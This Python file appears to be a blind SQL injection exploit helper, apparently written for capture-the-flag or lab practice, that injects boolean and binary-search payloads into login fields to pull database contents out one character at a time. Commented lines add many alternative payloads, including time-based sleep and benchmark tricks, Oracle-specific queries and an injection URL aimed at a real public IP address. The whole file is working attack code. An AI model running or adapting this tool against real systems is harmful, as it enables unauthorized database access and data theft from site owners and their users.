import requests
import threading,sys
import string

class BaseSqliHelper:
    def __init__(self,host:str) -> None:
        self.host = host
        self.pt = string.printable
        pass

    def hack(self,payload:str)->bool:
        '''
        import time
        res = requests.post(f"{self.host}/login.php", data={
            "name":f"""admin' AND {payload} AND '1'='1""",
            "password":'admin'
        })

        #print(res.text)
        if "right" in res.text:
            return True
        elif '{ "msg" : "false" }' in res.text:
            return False
        else:
            time.sleep(2)
            return self.hack(payload)
        '''
        data = {
            "uname":f"-1' or {payload}#",
            "passwd":f"123"
        }
        res = requests.post(f"{self.host}/sqli.php",data=data)
        #print(res.content)
        if b"admin" in res.content:
            return True
        return False

    def equBlind(self,sql:str)->None:
        ret=""
        i = 1
        while True:
            flag = 0
            for ch in self.pt:
                #payload="0^((ascii(substr(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
                #payload="""||passwd/**/REGEXP/**/"^{}";\x00""".format(ret+ch)
                #payload = '"||(left({0},{1}))like("{2}")--+'.format(sql,i,ret+ch)
                payload=f'((ascii(substr(({sql}),{i},1)))={ord(ch)})'
                #payload='"||({0}) REGEXP "{1}" --+'.format(self.sql,ret+ch)
                #payload = f"1=(select decode(substr(user, {i}, 1), '{ch}', 1,0) from dual)"
                #payload = f"1=(SELECT decode(substr(banner, {i}, 1), '{ch}', 1,0) FROM v$version WHERE banner LIKE 'Oracle%')"
                #payload = f"1=(select decode(substr(object_name, {i}, 1), '{ch}', 1,0) from all_objects where object_name like '%EKI%' or object_name like '%Eki%')"
                #payload = f"1=(select decode(substr({poc}, {i}, 1), '{ch}', 1,0) from dual)"
                sys.stdout.write("{0} [-] Result : -> {1} <-\r".format(threading.current_thread().name,ret+ch))
                sys.stdout.flush()
                if self.hack(payload):
                    ret=ret+ch
                    sys.stdout.write("{0} [-] Result : -> {1} <-\r".format(threading.current_thread().name,ret))
                    sys.stdout.flush()
                    flag = 1
                    break
            if flag == 0:
                break
            i+=1
        sys.stdout.write(f"{threading.current_thread().name} [+] Result : -> {ret} <-")

    def efBlind(self,sql:str)->None:
        ret=""
        i = 1
        while True:
            l=20
            r=130
            while(l+1<r):
                mid=(l+r)//2
                #payload="0^((ascii(substr(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
                #payload="0^((ascii(mid(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
                #payload="if((ascii(substr(({0}),{1},1)))>{2},1,0)".format(sql,i,mid)
                #payload="union select * from images where id=if((ascii(substr(({0}),{1},1)))>{2},1,0)#".format(sql,i,mid)
                #payload=f"if((ascii(substr(({sql}),{i},1)))>{mid},sleep(3),0)--+"
                payload=f"if((ascii(substr(({sql}),{i},1)))>{mid},1,0)"
                #payload="and case when (ascii(substr({},{},1))>{}) then (benchmark(1000000,sha(1))) else 2 end".format(sql,i,mid)

                #payload = "if((ascii(substr(({0}),{1},1)))>{2},sleep(3),0)".format(sql,i,mid)

                #UrZ = 'http://122.112.249.228:10080/index.php?id=2350" and if(length(database())>{0},1, sLeep(3))--+'
                #print payload
                if self.hack(payload):
                    l=mid
                else :
                    r=mid
            if(chr(r) not in self.pt):
                break
            i+=1
            ret=ret+chr(r)
            sys.stdout.write("[-]{0} Result : -> {1} <-\r".format(threading.current_thread().name,ret))
            sys.stdout.flush()
        sys.stdout.write(f"{threading.current_thread().name} [+] Result : -> {ret} <-")

if __name__ == "__main__":
    host = "http://127.0.0.1:2335"
    sqlexp = BaseSqliHelper(host=host)
    print(sqlexp.hack("1=1"))
    sql = "select database()"
    sqlexp.equBlind(sql)
    sqlexp.efBlind(sql)